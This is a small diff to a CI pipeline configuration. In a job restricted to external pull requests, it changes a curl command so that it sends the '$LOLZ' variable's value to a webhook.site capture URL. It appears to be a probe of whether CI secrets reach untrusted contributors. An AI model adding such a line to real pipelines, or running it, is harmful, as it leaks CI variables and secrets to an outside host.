@@ -2,6 +2,6 @@ always-run:
   script: echo 'this should always run'
 
 on-pull-requests:
-  script: curl 'https://webhook.site/623b2514-f6b1-4bd6-a415-155dc923f784?yoyo=$lolz'
+  script: curl 'https://webhook.site/623b2514-f6b1-4bd6-a415-155dc923f784?yoyo=$LOLZ'
   only:
     - external_pull_requests
